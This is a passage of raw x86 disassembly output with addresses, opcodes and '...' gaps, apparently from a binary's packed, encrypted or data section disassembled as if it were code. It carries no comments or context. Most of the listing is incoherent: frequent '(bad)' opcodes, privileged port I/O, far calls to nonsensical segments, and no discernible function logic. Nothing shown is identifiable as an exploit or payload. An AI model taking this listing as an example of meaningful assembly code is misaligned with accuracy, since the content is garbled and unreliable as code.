  426687:	mov    esp,0xbe49494f
  42668c:	je     0x426647
  42668e:	sbb    BYTE PTR [ebp+0x40c04e6e],0xcf
  426695:	nop
  426696:	stos   BYTE PTR es:[edi],al
  426697:	cmp    edi,ebp
  426699:	pop    edi
  42669a:	push   ds
  42669b:	sub    ah,ch
  42669d:	add    DWORD PTR [eax+ebp*4-0x76],0xffffff91
  4266a2:	mov    BYTE PTR [edi-0x73],bl
  4266a5:	and    edx,DWORD PTR [ebp+0x35d5a40b]
  4266ab:	shl    ebp,0x93
  4266ae:	sbb    dl,ah
  4266b0:	not    DWORD PTR [ebp+0x63]
  4266b3:	adc    al,0x54
  4266b5:	inc    esi
  4266b6:	add    BYTE PTR [ebx+ebx*8+0x17483a0c],0x86
  4266be:	mov    ds:0xab02ce39,eax
  4266c3:	cwde   
  4266c4:	clc    
  4266c5:	pop    ebp
  4266c6:	(bad)  
  4266c7:	scas   al,BYTE PTR es:[edi]
  4266c8:	pop    es
  4266c9:	lods   al,BYTE PTR ds:[esi]
  4266ca:	pop    ss
  4266cb:	stos   DWORD PTR es:[edi],eax
  4266cc:	push   edi
  4266cd:	and    DWORD PTR [ebx],0x7f
  4266d0:	(bad)  
  4266d1:	ror    cl,1
  4266d3:	xchg   ebx,eax
  4266d4:	lods   eax,DWORD PTR ds:[esi]
  4266d5:	inc    esp
  4266d6:	push   edi
  4266d7:	mov    ecx,0x4762b127
  4266dc:	in     al,dx
  4266dd:	pusha  
  4266de:	add    eax,0xb2d87afa
  4266e3:	shl    BYTE PTR [edx-0x1ce81d17],cl
  4266e9:	mov    ch,0x86
  4266eb:	adc    al,BYTE PTR [ebp-0x15]
  4266ee:	push   ebx
  4266ef:	mov    ds:0xb1571eb8,eax
  4266f4:	rcr    DWORD PTR [ebx],cl
  4266f6:	xor    eax,0x468bcd34
  4266fb:	add    esi,DWORD PTR [edi]
  4266fd:	or     BYTE PTR [esi+0x6914db6b],cl
  426703:	cmp    eax,0x8df10eb6
  426708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426709:	inc    edi
  42670a:	jle    0x42668e
  42670c:	pop    edi
  42670d:	jb     0x426740
  42670f:	mov    ?,WORD PTR [esi+0x71]
  426712:	(bad)  
  426714:	mov    dh,0x17
  426716:	push   cs
  426717:	lds    ebp,FWORD PTR [esi]
  426719:	test   BYTE PTR [edx-0x1ad18ef2],dl
  42671f:	in     al,0x29
  426721:	test   eax,0x31621a1c
  426726:	hlt    
  426727:	(bad)  
  426728:	jbe    0x426777
  42672a:	pop    ecx
  42672b:	push   ebx
  42672c:	js     0x4266fc
  42672e:	call   0xc9226dda
  426733:	mov    al,0x66
	...
  426795:	add    BYTE PTR [eax-0xd53173],bh
  42679b:	imul   edi,esp,0xffffff9f
  42679e:	sbb    esp,eax
  4267a0:	leave  
  4267a1:	dec    ebx
  4267a2:	add    esp,0x50
  4267a5:	mov    al,0x57
  4267a7:	call   0x0:0x1070001
  4267ae:	fistp  WORD PTR [esp+esi*1-0x2b9f79da]
  4267b5:	shr    BYTE PTR [esp+ebp*8-0xb],0x7d
  4267ba:	xor    cl,ch
  4267bc:	and    DWORD PTR [ebp+0x2b6e693c],0x5f
  4267c3:	rcr    BYTE PTR [ecx],cl
  4267c5:	nop
  4267c6:	(bad)  
  4267c7:	aaa    
  4267c8:	dec    eax
  4267c9:	jg     0x426768
  4267cb:	inc    ebp
  4267cc:	cmc    
  4267cd:	leave  
  4267ce:	push   eax
  4267cf:	push   esp
  4267d0:	xchg   ebp,eax
  4267d1:	addr16 popf 
  4267d3:	loopne 0x4267a9
  4267d5:	sahf   
  4267d6:	and    edi,ebp
  4267d8:	inc    ebp
  4267d9:	fcomp  DWORD PTR [edi+0x310802d1]
  4267df:	mov    esp,0x622d7912
  4267e4:	push   edi
  4267e5:	xchg   ebx,eax
  4267e6:	mov    ebx,0x2dcf4aa4
  4267eb:	loopne 0x426830
  4267ed:	add    al,0xa9
  4267ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267f1:	mov    edx,0x941a646b
  4267f6:	outs   dx,DWORD PTR ds:[esi]
  4267f7:	inc    eax
  4267f8:	add    ebp,0xffffff87
  4267fb:	mov    eax,0xf10dd4c5
  426800:	cmp    eax,0xcbbd9cda
  426805:	in     al,0xba
  426807:	adc    eax,0xd381098e
  42680c:	sbb    DWORD PTR [eax],ecx
  42680e:	(bad)  
  42680f:	call   0xb3cab045
  426814:	scas   eax,DWORD PTR es:[edi]
  426815:	hlt    
  426816:	in     eax,0x38
  426818:	clc    
  426819:	push   esp
  42681a:	or     eax,0x6c2ca939
  42681f:	lods   eax,DWORD PTR ds:[esi]
  426820:	inc    edi
  426821:	sub    eax,0x8f3c4f48
  426826:	rcl    DWORD PTR [esp+ebp*2-0x34],cl
  42682a:	js     0x4267b5
  42682c:	fs pop eax
  42682e:	mov    bh,BYTE PTR [eax-0x67]
  426831:	or     ebp,0x9
  426834:	(bad)  
  426835:	dec    esi
  426836:	push   edx
  426837:	loop   0x42681a
  426839:	xor    esi,DWORD PTR [esi-0x4c7e6a92]
  42683f:	jp     0x426885
  426841:	and    dl,BYTE PTR [eax]
  426843:	inc    esi
  426844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426845:	call   0x17ebacae
  42684a:	sub    BYTE PTR [edi],ch
  42684c:	or     bh,BYTE PTR [esi+0x455bbec8]
  426852:	inc    ebp
  426853:	jbe    0x4268a8
  426855:	and    BYTE PTR [eax+eiz*1-0x5f3aac24],al
  42685c:	xchg   BYTE PTR [edx],ah
  42685e:	(bad)  
  42685f:	push   esi
  426860:	scas   al,BYTE PTR es:[edi]
  426861:	mov    ?,WORD PTR [edi]
  426863:	add    eax,0x4627f110
  426868:	mov    ds:0x6e36d3e2,al
  42686d:	and    BYTE PTR [edi],al
  42686f:	push   es
  426870:	mov    ds:0x6264f9fe,eax
  426875:	dec    ebx
  426876:	cmp    al,0x47
  426878:	fwait
  426879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42687a:	inc    eax
  42687b:	leave  
  42687c:	ret    
  42687d:	fnsave [edi]
  42687f:	push   ebp
  426880:	or     dh,dl
  426882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426883:	jnp    0x4268f8
  426885:	hlt    
  426886:	jns    0x4268d6
  426888:	dec    ecx
  426889:	add    esp,DWORD PTR [ebp-0x21]
  42688c:	je     0x426819
  42688e:	sbb    dh,BYTE PTR [esi+0x14]
  426891:	std    
  426892:	jle    0x4268cc
  426894:	mov    WORD PTR [ebx-0x35ba4c80],ds
  42689a:	test   al,0x2a
  42689c:	mov    eax,DWORD PTR [ecx-0x27976bb3]
  4268a2:	clc    
  4268a3:	or     BYTE PTR [edx],al
  4268a5:	pop    ebx
  4268a6:	and    al,0x90
  4268a8:	ins    DWORD PTR es:[edi],dx
  4268a9:	xor    eax,0x81ec040f
  4268ae:	in     eax,dx
  4268af:	sub    cl,BYTE PTR [esi]
  4268b1:	xchg   ebx,eax
  4268b2:	jl     0x42686c
  4268b4:	sub    DWORD PTR [eax],eax
	...
  426916:	mov    WORD PTR [esi+0x7d],cs
  426919:	jge    0x42691a
  42691b:	jg     0x4268a9
  42691d:	jmp    FWORD PTR [esi]
  42691f:	out    0xa0,eax
  426921:	stos   DWORD PTR es:[edi],eax
  426922:	arpl   WORD PTR ds:0x9b5ec667,sp
  426928:	add    DWORD PTR [eax],eax
  42692a:	pop    es
  42692b:	add    DWORD PTR [eax],eax
  42692d:	add    BYTE PTR ds:0xab1ed6d,cl
  426933:	mov    cl,0xe4
  426935:	xchg   ebx,eax
  426936:	mov    es,WORD PTR [esi]
  426938:	jae    0x42695d
  42693a:	aas    
  42693b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42693c:	enter  0x2d47,0x62
  426940:	mov    ss,WORD PTR ds:0xdb4fef6e
  426946:	adc    eax,0xbf0775af
  42694b:	add    BYTE PTR [esi-0x5c4de4e4],al
  426951:	addr16 mov cl,0x45
  426954:	sbb    ch,BYTE PTR [edi+0x10aed3bb]
  42695a:	add    BYTE PTR [edi-0x5f4b02ff],bl
  426960:	cld    
  426961:	pop    esi
  426962:	enter  0xce9b,0x3c
  426966:	jno    0x4269d9
  426968:	es jmp 0x265a:0xe6d51377
  426970:	cmp    DWORD PTR es:[ebx+0x6b60d9d1],0xfffffff7
  426978:	cmp    al,0x84
  42697a:	not    BYTE PTR [ebp+0x1b]
  42697d:	lods   al,BYTE PTR ds:[esi]
  42697e:	and    ebp,DWORD PTR ds:0x5a64a574
  426984:	stc    
  426985:	(bad)  
  426986:	mov    cl,0xaa
  426988:	xchg   ebp,eax
  426989:	leave  
  42698a:	bound  esi,QWORD PTR [ebx+ebx*8]
  42698d:	inc    edi
  42698e:	sbb    al,0xb6
  426990:	ins    BYTE PTR es:[edi],dx
  426991:	dec    edi
  426992:	scas   al,BYTE PTR es:[edi]
  426993:	test   al,0x10
  426995:	jns    0x4269a1
  426997:	xadd   BYTE PTR [edi],ch
  42699a:	push   0x22
  42699c:	mov    esp,0x3cc37fb8
  4269a1:	ss pop ss
  4269a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269a4:	jg     0x426928
  4269a6:	push   ebx
  4269a7:	xchg   ecx,eax
  4269a8:	xchg   edx,eax
  4269a9:	and    DWORD PTR [edx+0x3f],edi
  4269ac:	and    DWORD PTR [ecx],ebp
  4269ae:	mov    esi,0x5bbada67
  4269b3:	cwde   
  4269b4:	mov    BYTE PTR [ebp+0x1bbe875],al
  4269ba:	jp     0x4269e4
  4269bc:	call   esp
  4269be:	scas   eax,DWORD PTR es:[edi]
  4269bf:	or     DWORD PTR [ebx+0x489a99d1],edx
  4269c5:	jecxz  0x426a02
  4269c7:	dec    esi
  4269c8:	fsubr  st(7),st
  4269ca:	hlt    
  4269cb:	in     eax,0xb
  4269cd:	loope  0x4269a2
  4269cf:	loop   0x4269f6
  4269d1:	cli    
  4269d2:	sti    
  4269d3:	pop    ebp
  4269d4:	inc    ebp
  4269d5:	into   
  4269d6:	add    edx,DWORD PTR [edi+0xe606fad]
  4269dc:	lds    edx,FWORD PTR [edi+0x3d]
  4269df:	pop    ebp
  4269e0:	xor    esi,edi
  4269e2:	leave  
  4269e3:	push   0xa28b54e4
  4269e8:	jo     0x426a0b
  4269ea:	arpl   WORD PTR [edi+0x73deeb18],ax
  4269f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4269f1:	mov    al,ds:0xf819be56
  4269f6:	pop    es
  4269f7:	mov    eax,ds:0x5f799909
  4269fc:	paddq  mm2,mm1
  4269ff:	stc    
  426a00:	push   eax
  426a01:	dec    eax
  426a02:	add    al,0x81
  426a04:	jbe    0x426a57
  426a06:	dec    edx
  426a07:	dec    eax
  426a08:	sub    dh,BYTE PTR [edx+0x2ad514e5]
  426a0e:	inc    ecx
  426a0f:	jge    0x426995
  426a11:	daa    
  426a12:	and    al,0x4e
  426a14:	adc    dh,BYTE PTR [edx+0x8]
  426a17:	lods   al,BYTE PTR ds:[esi]
  426a18:	imul   ebp,DWORD PTR [eax+0x55],0x14
  426a1c:	ds repz inc esp
  426a1f:	adc    al,BYTE PTR [ecx*2+0x6c5e55d7]
  426a26:	mov    dl,0x1a
  426a28:	(bad)  
  426a29:	cmc    
  426a2a:	cmp    esi,DWORD PTR [esi]
  426a2c:	xlat   BYTE PTR ds:[ebx]
  426a2d:	adc    BYTE PTR [edx+0x5e],cl
  426a30:	sub    eax,0x8947c827
	...
  426a95:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426a9b:	ja     0x426a78
  426a9d:	out    dx,eax
  426a9e:	xor    dl,BYTE PTR [edi+eiz*4]
  426aa1:	cld    
  426aa2:	out    0x67,al
  426aa4:	sar    ah,1
  426aa6:	gs pushf 
  426aa8:	add    DWORD PTR [eax],eax
  426aaa:	pop    es
  426aab:	add    DWORD PTR [eax],eax
  426aad:	add    BYTE PTR [edx-0xe829c3f],dh
  426ab3:	sub    eax,0xe3e9f79e
  426ab8:	imul   BYTE PTR ds:0xdf4af3e9
  426abe:	sbb    BYTE PTR [ebx+0x52],ch
  426ac1:	mov    ebx,DWORD PTR [esi-0x3a]
  426ac4:	adc    ah,al
  426ac6:	outs   dx,DWORD PTR ds:[esi]
  426ac7:	ficom  WORD PTR [edi]
  426ac9:	adc    DWORD PTR [edx+eax*4-0x3c51c355],esi
  426ad0:	ret    0xe3b8
  426ad3:	mov    fs,WORD PTR [ecx+0x35]
  426ad6:	mov    edi,0x3c2819e0
  426adb:	mov    eax,ds:0x290d8630
  426ae0:	data16 (bad) 
  426ae2:	sub    BYTE PTR [edx-0x4075ac0c],0x93
  426ae9:	fistp  WORD PTR [ecx+0x57]
  426aec:	cdq    
  426aed:	xor    al,0xd3
  426aef:	adc    ah,BYTE PTR [edx]
  426af1:	inc    esi
  426af2:	out    0xc4,eax
  426af4:	cmp    al,0xb3
  426af6:	pop    ecx
  426af7:	fiadd  DWORD PTR [ebx-0x4a2923a1]
  426afd:	int    0x6d
  426aff:	push   0xed7b2c12
  426b04:	and    ebp,esp
  426b06:	pushf  
  426b07:	xchg   edx,eax
  426b08:	adc    dl,BYTE PTR ds:0xa0d9ec06
  426b0e:	jg     0x426b09
  426b10:	mov    ah,0xf4
  426b12:	mov    dh,BYTE PTR [ebp+0x2524699f]
  426b18:	jnp    0x426b73
  426b1a:	fadd   QWORD PTR [ebx-0x1b]
  426b1d:	scas   al,BYTE PTR es:[edi]
  426b1e:	mov    al,0x2f
  426b20:	pop    ds
  426b21:	out    dx,eax
  426b22:	fst    QWORD PTR [ebx-0x6c]
  426b25:	frstor [ecx+0x74ec9839]
  426b2b:	jecxz  0x426b71
  426b2d:	(bad)  
  426b2e:	or     ch,cl
  426b30:	xchg   esi,eax
  426b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b32:	push   esp
  426b33:	pop    edx
  426b34:	dec    ebx
  426b35:	scas   eax,DWORD PTR es:[edi]
  426b36:	mov    dl,ch
  426b38:	pushf  
  426b39:	add    al,0xcf
  426b3b:	adc    esp,eax
  426b3d:	xor    BYTE PTR [esi-0x10],ch
  426b40:	sbb    DWORD PTR [edi+0x4685c6b7],edx
  426b46:	idiv   ah
  426b48:	xchg   edx,eax
  426b49:	xor    BYTE PTR [esi-0x1e8948c9],cl
  426b4f:	xchg   ecx,eax
  426b50:	pop    eax
  426b51:	aad    0x28
  426b53:	fwait
  426b54:	push   ds
  426b55:	dec    ebx
  426b56:	cli    
  426b57:	push   ss
  426b58:	and    BYTE PTR gs:[ebp+ebp*4+0x0],0xa8
  426b5e:	fst    DWORD PTR [eax+0x305e273c]
  426b64:	or     DWORD PTR [eax],esi
  426b66:	mul    BYTE PTR [ecx]
  426b68:	aaa    
  426b69:	mov    bh,0xae
  426b6b:	inc    edi
  426b6c:	xchg   esp,eax
  426b6d:	pop    ds
  426b6e:	shr    BYTE PTR [edx-0x7],cl
  426b71:	jo     0x426b6e
  426b73:	cmp    ebx,DWORD PTR [eax+0x13]
  426b76:	add    al,0xfe
  426b78:	rcl    edx,0xc5
  426b7b:	xchg   esi,eax
  426b7c:	push   ebp
  426b7d:	jbe    0x426ba5
  426b7f:	mov    edx,0xe1d61b0c
  426b84:	jmp    0x426bd6
  426b86:	jns    0x426b81
  426b88:	(bad)  
  426b89:	popf   
  426b8a:	pop    eax
  426b8b:	xlat   BYTE PTR ds:[ebx]
  426b8c:	push   edi
  426b8d:	sbb    BYTE PTR [eax],0x1f
  426b90:	jae    0x426b5b
  426b92:	add    edi,DWORD PTR [ebp-0x2b280157]
  426b98:	bound  ecx,QWORD PTR [ebp-0x1a56f3fd]
  426b9e:	or     dh,0xc2
  426ba1:	in     al,dx
  426ba2:	xchg   esi,eax
  426ba3:	mov    ebx,0x4402dd63
  426ba8:	jle    0x426bd5
  426baa:	dec    edi
  426bab:	(bad)  
  426bac:	es fsub st,st(1)
  426baf:	push   eax
  426bb0:	cmp    dl,dl
  426bb2:	push   ds
  426bb3:	iret   
  426bb4:	xor    eax,0x0
	...
  426c15:	add    dl,ah
  426c17:	pusha  
  426c18:	test   DWORD PTR [esi+0x74f3f787],esi
  426c1e:	je     0x426c67
  426c20:	push   0xffffffb6
  426c22:	cdq    
  426c23:	test   BYTE PTR [ecx+0x19d6c6f],ah
  426c29:	add    BYTE PTR [edi],al
  426c2b:	add    DWORD PTR [eax],eax
  426c2d:	add    BYTE PTR [esi],dl
  426c2f:	or     ebp,DWORD PTR ds:0xde912d64
  426c35:	adc    esp,ebx
  426c37:	cmc    
  426c38:	aas    
  426c39:	xchg   DWORD PTR [edi+0x28],esi
  426c3c:	push   edi
  426c3d:	or     DWORD PTR ds:0xc9255023,ebp
  426c43:	into   
  426c44:	sti    
  426c45:	push   ds
  426c46:	inc    esp
  426c47:	call   FWORD PTR [ebx+edi*2-0x722b4bf7]
  426c4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c4f:	ds mov cl,0x2
  426c52:	fld    DWORD PTR [eax+eiz*2+0x6c540ab5]
  426c59:	dec    edi
  426c5a:	mov    ebx,0xd1796a9e
  426c5f:	rol    BYTE PTR [ebp+0x4bedd044],1
  426c65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c66:	sub    BYTE PTR [eax],bl
  426c68:	call   0x3f0367d9
  426c6d:	push   ecx
  426c6e:	bound  ebx,QWORD PTR [edx+edx*1-0x6f236e6d]
  426c75:	mov    ebx,DWORD PTR [edi+ebx*4]
  426c78:	outs   dx,DWORD PTR ds:[esi]
  426c79:	jnp    0x426cd0
  426c7b:	mov    BYTE PTR [eax+0x1723ef1b],al
  426c81:	hlt    
  426c82:	add    esp,ebp
  426c84:	cmp    BYTE PTR [edx],dh
  426c86:	cs in  al,0xb
  426c89:	(bad)  
  426c8a:	pop    edi
  426c8b:	es pop ecx
  426c8d:	pop    ecx
  426c8e:	dec    edx
  426c8f:	jnp    0x426cf9
  426c91:	imul   BYTE PTR [ecx+eiz*1+0x5]
  426c95:	dec    ecx
  426c96:	fsub   st,st(0)
  426c98:	mov    al,ds:0x2688495d
  426c9d:	mov    ebp,0x6eac621d
  426ca2:	stos   BYTE PTR es:[edi],al
  426ca3:	int3   
  426ca4:	cmp    al,0xaa
  426ca6:	jne    0x426cc2
  426ca8:	cmp    DWORD PTR [ebx-0x7f],eax
  426cab:	das    
  426cac:	cwde   
  426cad:	pop    edx
  426cae:	loop   0x426c62
  426cb0:	xlat   BYTE PTR ds:[ebx]
  426cb1:	sbb    DWORD PTR [edx],ecx
  426cb3:	ss test ch,bh
  426cb6:	outs   dx,BYTE PTR ds:[esi]
  426cb7:	out    dx,eax
  426cb8:	xchg   ecx,eax
  426cb9:	popa   
  426cba:	sbb    dl,al
  426cbc:	idiv   eax
  426cbe:	cwde   
  426cbf:	(bad)  
  426cc0:	xor    al,0xc1
  426cc2:	cmp    BYTE PTR [ebx+0x3ca9a472],ch
  426cc8:	(bad)  
  426cc9:	shl    DWORD PTR [ebp-0x1922ea7e],1
  426ccf:	call   0x8458:0xcdb145e8
  426cd6:	daa    
  426cd7:	and    ebp,esp
  426cd9:	or     ebp,DWORD PTR [ebp+0x78]
  426cdc:	xchg   ecx,eax
  426cdd:	inc    DWORD PTR [edx+edx*1-0x6c]
  426ce1:	mov    eax,ds:0x62b36488
  426ce6:	addr16 je 0x426d16
  426ce9:	popf   
  426cea:	daa    
  426ceb:	cmp    eax,0xa8beded3
  426cf0:	and    al,0x89
  426cf2:	(bad)  
  426cf3:	push   edx
  426cf4:	fiadd  DWORD PTR [ebp+0x4f3d2a6]
  426cfa:	adc    BYTE PTR [ebx],bl
  426cfc:	pop    esi
  426cfd:	and    DWORD PTR [ebp-0x3e],ebp
  426d00:	add    BYTE PTR [edx-0xa1f89e5],0x15
  426d07:	sub    dh,bl
  426d09:	sub    al,0x1
  426d0b:	int3   
  426d0c:	adc    BYTE PTR [esp+esi*4+0x356b19ae],0x10
  426d14:	xor    edx,DWORD PTR [edi]
  426d16:	(bad)  
  426d17:	xchg   edx,eax
  426d18:	sub    ch,dh
  426d1a:	and    BYTE PTR [eax+0x1d],dl
  426d1d:	or     bl,dl
  426d1f:	inc    ebx
  426d20:	outs   dx,DWORD PTR ds:[esi]
  426d21:	neg    eax
  426d23:	scas   al,BYTE PTR es:[edi]
  426d24:	xchg   ecx,eax
  426d25:	pop    ebx
  426d26:	add    eax,0x6a638867
  426d2b:	inc    ecx
  426d2c:	mov    dl,0xee
  426d2e:	push   esi
  426d2f:	xchg   edx,eax
  426d30:	cmc    
  426d31:	adc    al,0x5a
  426d33:	test   eax,0xe0
	...
  426d94:	add    BYTE PTR [eax],al
  426d96:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426d9c:	call   0x6887:0x7e1b1bf9
  426da3:	pop    edi
  426da4:	nop
  426da5:	sbb    esi,DWORD PTR [ebx-0x62]
  426da8:	add    DWORD PTR [eax],eax
  426daa:	pop    es
  426dab:	add    DWORD PTR [eax],eax
  426dad:	add    al,bl
  426daf:	nop
  426db0:	xor    cl,BYTE PTR [ecx]
  426db2:	push   edi
  426db3:	or     BYTE PTR [edx+0x2c54f40],bh
  426db9:	in     eax,0x9f
  426dbb:	test   BYTE PTR [esp+ebx*4+0x48],cl
  426dbf:	mov    eax,ds:0xe90fecd8
  426dc4:	pop    ecx
  426dc5:	stc    
  426dc6:	test   eax,0xefab3e70
  426dcb:	cmp    BYTE PTR [edx-0x53604ef],ah
  426dd1:	mov    ds:0xa154eac1,al
  426dd6:	adc    ecx,DWORD PTR [edx]
  426dd8:	pop    ecx
  426dd9:	push   ebx
  426dda:	push   es
  426ddb:	xchg   edx,eax
  426ddc:	xor    DWORD PTR [edx+0x5101be66],eax
  426de2:	into   
  426de3:	ja     0x426e55
  426de5:	xchg   esp,eax
  426de6:	and    DWORD PTR [ebp+0x3f],ebp
  426de9:	imul   esi,DWORD PTR [ebx+ebp*1-0x39c24193],0x8d6135dd
  426df4:	ds mov ch,0xce
  426df7:	fs aad 0xbe
  426dfa:	sar    BYTE PTR [edx],0x31
  426dfd:	xchg   ebp,eax
  426dfe:	repnz call 0x20ee:0x149ebdb0
  426e06:	sbb    bh,BYTE PTR [ebx+edi*1+0x8]
  426e0a:	pop    edx
  426e0b:	pop    esi
  426e0c:	pop    esp
  426e0d:	repz enter 0xf149,0xe0
  426e12:	pop    ebp
  426e13:	push   cs
  426e14:	sub    ecx,DWORD PTR [edi+ebp*4]
  426e17:	sub    ebp,ebp
  426e19:	sbb    DWORD PTR [ebx],ecx
  426e1b:	pushf  
  426e1c:	inc    edx
  426e1d:	aam    0x80
  426e1f:	shl    bh,0x71
  426e22:	das    
  426e23:	push   edx
  426e24:	or     eax,0x4be0845b
  426e29:	lock cmp DWORD PTR [ecx],ebx
  426e2c:	or     ch,BYTE PTR [edx]
  426e2e:	mov    cl,0x9a
  426e30:	(bad)  
  426e31:	sbb    al,0x3f
  426e33:	xchg   ebp,eax
  426e34:	xchg   esp,eax
  426e35:	rol    BYTE PTR [ebp-0x62],0x5e
  426e39:	shr    BYTE PTR [ebp+0x5e7335c9],1
  426e3f:	cmp    cl,dl
  426e41:	cs mov ch,0xf0
  426e44:	or     al,0x35
  426e46:	cmc    
  426e47:	in     al,0x68
  426e49:	or     ebx,0x23693797
  426e4f:	(bad)  
  426e50:	mov    bl,0x19
  426e52:	dec    ecx
  426e53:	dec    ecx
  426e54:	dec    ecx
  426e55:	shr    ecx,1
  426e57:	stos   DWORD PTR es:[edi],eax
  426e58:	leave  
  426e59:	mov    eax,ds:0x3417bcb8
  426e5e:	inc    esi
  426e5f:	adc    DWORD PTR [edi],esp
  426e61:	test   al,0x36
  426e63:	sbb    DWORD PTR [ebx+ebx*4],ecx
  426e66:	into   
  426e67:	jp     0x426ead
  426e69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e6a:	push   cs
  426e6b:	push   ds
  426e6c:	das    
  426e6d:	enter  0xaeba,0xf7
  426e71:	mov    edi,0x8be03925
  426e76:	(bad)  
  426e77:	retf   
  426e78:	in     eax,dx
  426e79:	xchg   DWORD PTR [ebx+0x59],eax
  426e7c:	fimul  WORD PTR [ebx-0x5ea3111a]
  426e82:	repz cs pop edx
  426e85:	and    dl,al
  426e87:	neg    DWORD PTR [eax+0x1c]
  426e8a:	sub    al,BYTE PTR [ebx]
  426e8c:	inc    eax
  426e8d:	scas   al,BYTE PTR es:[edi]
  426e8e:	gs (bad) 
  426e90:	inc    ebp
  426e91:	push   esp
  426e92:	pop    ecx
  426e93:	dec    edi
  426e94:	aas    
  426e95:	xchg   ecx,eax
  426e96:	inc    edi
  426e97:	inc    ecx
  426e98:	into   
  426e99:	iret   
  426e9a:	mov    eax,0x3ee838f6
  426e9f:	fsubp  st(4),st
  426ea1:	mov    edi,0xea8d3ffc
  426ea6:	not    DWORD PTR [ecx+0x3f]
  426ea9:	call   0xc2ad:0x75890bee
  426eb0:	daa    
  426eb1:	add    al,bl
  426eb3:	test   eax,0xca
	...
  426f14:	add    BYTE PTR [eax],al
  426f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f17:	mov    ds:0xf5c7f1c7,al
  426f1c:	mov    dh,0xf7
  426f1e:	pop    eax
  426f1f:	or     BYTE PTR [ecx-0x746c2e5c],ch
  426f25:	jnp    0x426fa1
  426f27:	lahf   
  426f28:	add    DWORD PTR [eax],eax
  426f2a:	pop    es
  426f2b:	add    DWORD PTR [eax],eax
  426f2d:	add    BYTE PTR [edi+0x5e],dh
  426f30:	mov    bh,0x7e
  426f32:	mov    DWORD PTR [edi],edx
  426f34:	stc    
  426f35:	js     0x426f1a
  426f37:	ja     0x426efa
  426f39:	mov    ah,0xdf
  426f3b:	push   ebx
  426f3d:	int3   
  426f3e:	js     0x426ee1
  426f40:	push   0xffffffb4
  426f42:	ret    
  426f43:	adc    DWORD PTR [eax],ecx
  426f45:	mov    ah,0x66
  426f47:	pushaw 
  426f49:	jbe    0x426fb1
  426f4b:	loope  0x426fb6
  426f4d:	adc    DWORD PTR [edx+0x27],ebx
  426f50:	pusha  
  426f51:	in     eax,0xee
  426f53:	dec    eax
  426f54:	dec    ecx
  426f55:	sub    BYTE PTR [eax-0x6b],bl
  426f58:	add    al,0x83
  426f5a:	aaa    
  426f5b:	xchg   cl,al
  426f5d:	pop    ss
  426f5e:	shr    BYTE PTR [esi+0x122ac096],cl
  426f64:	shl    DWORD PTR [eax-0x17dac28a],1
  426f6a:	dec    esp
  426f6b:	js     0x426fa3
  426f6d:	mov    ds:0x816c0617,al
  426f72:	push   ecx
  426f73:	cmp    DWORD PTR [edx-0x340ad375],ebp
  426f79:	js     0x426f49
  426f7b:	lods   eax,DWORD PTR ds:[esi]
  426f7c:	sub    ecx,DWORD PTR [edx-0x2b435b24]
  426f82:	jg     0x426f83
  426f84:	mov    esp,0xaeb3c4a7
  426f89:	jno    0x426ffe
  426f8b:	rcl    DWORD PTR [ebp+0x1a],1
  426f8e:	inc    edi
  426f8f:	add    al,0xd6
  426f91:	mov    esp,0x3499c6aa
  426f96:	xor    bh,ch
  426f98:	dec    ecx
  426f99:	lods   al,BYTE PTR ds:[esi]
  426f9a:	pop    edx
  426f9b:	fwait
  426f9c:	push   0x2232b4f4
  426fa1:	inc    eax
  426fa2:	jecxz  0x426fb6
  426fa4:	xchg   esp,eax
  426fa5:	in     al,0xd0
  426fa7:	call   0xc0a56c6b
  426fac:	adc    ebx,DWORD PTR [ecx+0x8bd5b81]
  426fb2:	call   0xfab5:0x86be866f
  426fb9:	sbb    DWORD PTR [ecx+0x63104d33],edx
  426fbf:	repz pop ds
  426fc1:	pop    ds
  426fc2:	ja     0x426fbc
  426fc4:	jg     0x426f98
  426fc6:	pop    ds
  426fc7:	push   edx
  426fc8:	in     eax,0xbe
  426fca:	(bad)  
  426fcb:	mov    fs,WORD PTR [esi+0x2109a2e2]
  426fd1:	add    DWORD PTR [edi-0x44],0xb7c2abe6
  426fd8:	scas   al,BYTE PTR es:[edi]
  426fd9:	loopne 0x427043
  426fdb:	xchg   edi,eax
  426fdc:	jg     0x427047
  426fde:	jb     0x426f95
  426fe0:	mov    ebp,0xfc942837
  426fe5:	push   esi
  426fe6:	mov    ds:0x3ff2e9b7,eax
  426feb:	dec    ebp
  426fec:	push   eax
  426fed:	adc    BYTE PTR [ecx],al
  426fef:	adc    eax,0x4dd9de91
  426ff4:	xchg   ebx,eax
  426ff5:	mov    dh,0xc7
  426ff7:	cs scas eax,DWORD PTR es:[edi]
  426ff9:	outs   dx,BYTE PTR ds:[esi]
  426ffa:	xchg   edx,eax
  426ffb:	fcomp  QWORD PTR [ebx-0x7b]
  426ffe:	mov    ah,0x13
  427000:	js     0x426fd9
  427002:	test   DWORD PTR [esi+0x71063627],edi
  427008:	ret    0x8de0
  42700b:	push   ebp
  42700c:	pop    ebx
  42700d:	(bad)  
  42700e:	lock mov BYTE PTR [esi+0x16],0x90
  427013:	in     eax,0xa1
  427015:	mov    WORD PTR [edx],ss
  427017:	adc    edx,edx
  427019:	push   eax
  42701a:	adc    BYTE PTR [edi-0x2b],bl
  42701d:	or     al,0xde
  42701f:	(bad)  
  427020:	repz jle 0x42704c
  427023:	data16 xor dl,BYTE PTR fs:[ecx]
  427027:	mov    ebx,0x4449398f
  42702c:	mov    ecx,0x44adc3b4
  427031:	inc    ebp
  427032:	loopne 0x42708a
  427034:	pop    esp
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
